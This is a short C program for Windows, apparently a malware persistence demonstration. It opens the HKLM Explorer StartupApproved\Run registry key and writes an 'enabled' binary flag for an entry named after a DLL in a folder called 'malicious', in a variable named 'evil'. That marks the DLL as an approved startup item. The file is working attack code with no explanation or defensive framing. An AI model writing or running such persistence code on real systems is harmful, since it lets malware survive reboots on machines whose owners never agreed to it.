#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

  const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
  const char* evil = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.dll";

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR) path, 0, KEY_WRITE, &hkey);
  printf (res != ERROR_SUCCESS ? "Failed open registry key\n" : "Successfully open registry key\n");

  res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
  printf(res != ERROR_SUCCESS ? "Failed to set registry value\n" : "Successfully set registry value\n");
  RegCloseKey(hkey);
  return 0;
}
